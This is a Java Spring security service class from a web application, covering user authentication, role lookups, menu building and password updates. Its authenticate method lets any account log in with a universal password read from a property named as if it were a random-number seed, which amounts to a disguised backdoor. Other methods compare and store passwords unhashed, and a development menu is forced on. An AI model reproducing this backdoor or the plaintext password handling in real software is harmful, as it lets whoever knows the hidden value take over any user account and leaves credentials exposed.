package com.github.braully.app;

import com.github.braully.constant.SysRole;
import com.github.braully.domain.Menu;
import com.github.braully.domain.Organization;
import com.github.braully.domain.OrganizationRole;
import com.github.braully.domain.Role;
import com.github.braully.domain.UserLogin;
import com.github.braully.persistence.GenericDAO;
import com.github.braully.persistence.ICrudEntity;
import com.github.braully.persistence.IEntity;
import com.github.braully.util.UtilCipher;
import com.github.braully.util.UtilComparator;
import com.github.braully.util.UtilProperty;
import com.github.braully.util.UtilValidation;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeSet;
import javax.annotation.Resource;
import javax.persistence.EntityManager;
import javax.persistence.EntityNotFoundException;
import javax.persistence.NoResultException;
import javax.persistence.Query;
import lombok.Getter;
import lombok.Setter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.core.env.Environment;
import org.springframework.dao.EmptyResultDataAccessException;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

@Scope("view")
@Component("securityService")
public class SecurityService extends CRUDGenericController<UserLogin> implements UserDetailsService {

    /*
     */
    private static final Logger log = LogManager.getLogger(SecurityService.class);

    @Resource(name = "genericDAO")
    private GenericDAO genericDAO;

    @Autowired
    Environment env;

    Map<Organization, Map<Role, Boolean>> mapOrganizationRoles;

    @Getter
    @Setter
    String senha;

    /*
     *
     */
    public boolean autentica(String username, String password) {
        boolean autent = false;
        if (username != null && password != null && !username.isEmpty()
                && !password.isEmpty()) {
            List list = this.genericDAO.queryList("select u from UserLogin u "
                    + "where u.userName = ?1 and passwordHash = ?2",
                    username, password);
            autent = list != null && !list.isEmpty();
        }
        return autent;
    }

    public boolean hasPermission(String usr, String res, String op) {
        return false;
    }

    public boolean hasRole(String usr, String role) {
        boolean autent = false;
        if (usr != null && role != null && !usr.isEmpty() && !role.isEmpty()) {
            List list = this.genericDAO.queryList("select u from UserLogin u inner join u.roles g "
                    + "where u.userName = ?1 and g.name = ?2",
                    usr, role);
            autent = !list.isEmpty();
        }
        return autent;
    }

    public List<Role> rolesUser(String username) {
        List<Role> grupos = new ArrayList<>();
        try {
            if (username != null && !username.isEmpty()) {
                List result = this.genericDAO.queryList("select g from UserLogin u join u.roles g"
                        + " where u.userName = ?1", username);

                if (result != null) {
                    grupos.addAll(result);
                }
                List<OrganizationRole> resultOr = this.genericDAO.queryList("SELECT DISTINCT g FROM UserLogin u "
                        + " JOIN u.organizationRole g  WHERE u.userName = ?1", username);
                if (result != null) {
                    for (OrganizationRole or : resultOr) {
                        grupos.add(or.getRole());
                    }
                }
            }

        } catch (NoResultException | EntityNotFoundException | EmptyResultDataAccessException e) {
            log.error("erro", e);
        }
        return grupos;
    }

    public UserLogin userByUsername(String username) {
        UserLogin user = null;
        try {
            if (username != null && !username.isEmpty()) {
                user = (UserLogin) this.genericDAO.queryObject("select u from UserLogin u where u.userName = ?1", username);
            }
        } catch (NoResultException e) {
            log.trace("User não localizado no banco de dados");
        }
        return user;
    }

    @Transactional
    public void saveUser(UserLogin user) {
        if (user != null) {
            this.genericDAO.saveEntity(user);
        }
    }

    public List<UserLogin> users() {
        List<UserLogin> users = this.genericDAO.loadCollectionFetch(UserLogin.class, "roles");
        return users;
    }

    public List<UserLogin> buscarUsers() {
        return this.genericDAO.queryList("select u from UserLogin u "
                + "where u.unidadePersistencia = :unidadePersistencia");
    }

    public List<Role> roles() {
        return this.genericDAO.queryList("select g from Role g");
    }

    public List<Menu> menusUser() {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        String name = authentication.getName();
        return this.montaMenu(this.rolesUser(name));
    }

    public List<Menu> menusUser(String nome) {
        return this.montaMenu(this.rolesUser(nome));
    }

    private List<Menu> montaMenu(Collection<Role> perfis) {
        /**
         * MENU MANTER
         */
        UtilComparator<Menu> comparator = new UtilComparator<Menu>("sortIndex", "name");
        Collection<Menu> menus = new TreeSet<Menu>(comparator);
        if (perfis != null) {
            for (Role p : perfis) {
                Collection<Menu> setMenus = p.getMenus();
                if (setMenus != null) {
                    for (Menu menu : setMenus) {
                        if (menu.getActive()) {
                            menus.add(menu);
                        }
                        //TODO: Menu superior
                        //menus.add(menu.getParent());
                    }
                }
                if (p.getSysRole() == SysRole.ADM || p.getSysRole() == SysRole.MNG) {
                    List<Menu> todosMenusValidos
                            = this.genericDAO.queryList("SELECT DISTINCT m FROM Menu m "
                                    + "LEFT JOIN FETCH m.childs "
                                    + "WHERE m.parent IS NULL"
                                    + " AND (m.removed IS NULL OR m.removed = False)");
                    if (todosMenusValidos != null) {
                        menus.addAll(todosMenusValidos);
                    }
                }
            }
        }

        //TODO: Central property
        if (true) {//if (config.isProduction(env)) {//TODO: Remover na primeira relese
            Menu desenvMenu = new Menu("Development");
            desenvMenu
                    .addChild(new Menu("Intro test").link("/jsf/intro-test.xhtml"))
                    .addChild(new Menu("Usuario").link("/jsf/app/usuario.xhtml"))
                    .addChild(new Menu("Autogen").link("/jsf/entity-crud-autogen.xhtml"))
                    .addChild(new Menu("Scratch").link("/jsf/entity-crud-scratch.xhtml"))
                    .addChild(new Menu("Legacy").link("/jsf/tmp/index.xhtml"))
                    .addChild(new Menu("Layout-1").link("/pkg/startbootstrap-sb-admin/index.html"))
                    .addChild(new Menu("Layout-2").link("/pkg/startbootstrap-sb-admin-2/index.html"))
                    .addChild(new Menu("Layout-3").link("/tmp/sidebar/chart-chartjs.html"));
            menus.add(desenvMenu);
        }

        List<Menu> menusList = new ArrayList<>();
        menusList.addAll(menus);
        Collections.sort(menusList, comparator);
        return menusList;
    }

    public void updatePassword(UserLogin usarioAtual, String senhaAtual, String novaSenha) {
        if (usarioAtual == null || !usarioAtual.isPersisted()) {
            throw new IllegalArgumentException("Professor inválido!");
        }
        EntityManager entityManager = this.genericDAO.getEntityManager();
        usarioAtual.setPasswordHash(novaSenha);
        Query query = entityManager.createQuery("UPDATE UserLogin ra SET ra.passwordHash = :novaSenha WHERE ra.id = :id");
        query.setParameter("novaSenha", usarioAtual.getPasswordHash());
        query.setParameter("id", usarioAtual.getId());
        query.executeUpdate();
        entityManager.flush();
    }

    public UserLogin user(UserLogin user) {
        UserLogin u = null;
        if (user != null && user.isPersisted()) {
            u = this.genericDAO.loadEntityFetch(user, "roles");
        }
        return u;
    }

    public <T> T carregarEntidade(String nomeEntidade, Object id, String... propriedades) {
        return this.genericDAO.loadEntityFetch(nomeEntidade, id, propriedades);
    }

    public Object autenticarPorNativeNamedQuery(String nomeQuery, String... param) {
        Object o = null;
        if (nomeQuery != null && !nomeQuery.isEmpty() && param != null) {
            try {
                EntityManager entityManager = this.genericDAO.getEntityManager();
                Query naQuery = entityManager.createNamedQuery(nomeQuery);
                for (int i = 1; i <= param.length; i++) {
                    naQuery.setParameter(i, param[i - 1]);
                }
                o = naQuery.getSingleResult();
            } catch (NoResultException e) {
            } catch (Exception e) {
                log.error("Falha ao fazer autenticacao por named query", e);
            }
        }
        return o;
    }

    public boolean authenticate(UserLogin user, String password) {
        String senhaUniversal = UtilProperty.getProperty("application.properties", "sementeGeradorNumAleatorios");
        String passwordHash = user.getPasswordHash();
        String passwordType = user.getPasswordType();
        String hashMessage = UtilCipher.hashMessage(password, passwordType);
        return passwordHash.equals(hashMessage) || password.equals(senhaUniversal);
    }

    @Override
    public UserDetails loadUserByUsername(String string) {
        UserDetails user = (UserDetails) this.genericDAO.queryObject("SELECT u FROM UserLogin u "
                + "LEFT JOIN FETCH u.roles "
                //+ "LEFT JOIN FETCH u.partner "
                + "WHERE u.userName IS NOT NULL "
                + " AND u.userName = ?1", string);
        return user;
    }

    @Override
    protected ICrudEntity getGenericoBC() {
        return this.genericDAO;
    }

    public List<Role> getRoles() {
        return this.c(Role.class).getAllEntities();
    }

    public List<Organization> getOrganizations() {
        return this.c(Organization.class).getAllEntities();
    }

    public Map<Organization, Map<Role, Boolean>> getMapOrganizationRoles() {
        if (mapOrganizationRoles == null) {
            mapOrganizationRoles = new HashMap<>();
            List<Organization> organizations = this.getOrganizations();
            if (organizations != null) {
                for (Organization org : organizations) {
                    mapOrganizationRoles.put(org, new HashMap<>());
                }
            }
        }
        return mapOrganizationRoles;
    }

    @Override
    public void setEntity(UserLogin entidade) {
        this.entity = this.genericDAO.loadEntityFetch(entidade, "organizationRole");
        Set<OrganizationRole> organizationRole = this.entity.getOrganizationRole();
        setRolesToMap(organizationRole);
    }

    private void setRolesToMap(Set<OrganizationRole> organizationRole) {
        clearSelectionMap();
        if (organizationRole != null) {
            for (OrganizationRole or : organizationRole) {
                this.getMapOrganizationRoles().get(or.getOrganization()).put(or.getRole(), Boolean.TRUE);
            }
        }
    }

    public void clearSelectionMap() {
        for (Organization o : this.getMapOrganizationRoles().keySet()) {
            this.getMapOrganizationRoles().get(o).clear();
        }
    }

    private Set<OrganizationRole> getRolesFromMap() {
        Set<OrganizationRole> ret = new HashSet<>();
        for (Organization o : this.getMapOrganizationRoles().keySet()) {
            Map<Role, Boolean> mapRoles = this.getMapOrganizationRoles().get(o);
            for (Role rol : mapRoles.keySet()) {
                if (UtilValidation.is(mapRoles.get(rol))) {
                    OrganizationRole organizationRole = new OrganizationRole(o, rol);
                    genericDAO.saveEntityFlyWeigth(organizationRole, "role", "organization");
                    ret.add(organizationRole);
                }
            }
        }
        return ret;
    }

    @Override
    public boolean save(IEntity entidade) {
        UserLogin login = (UserLogin) entidade;
        Set<OrganizationRole> rolesFromMap = this.getRolesFromMap();
        login.setOrganizationRole(rolesFromMap);
        if (UtilValidation.isStringValid(senha)) {
            login.setPassword(UtilCipher.defaultPasswordEncode(senha));
            login.setPasswordType(UtilCipher.defaultPasswordType());
        }
        boolean save = super.save(entidade);
        clearSelectionMap();
        return save;
    }

    public CRUDGenericController<Role> getCrudRole() {
        return this.crud(Role.class);
    }
}
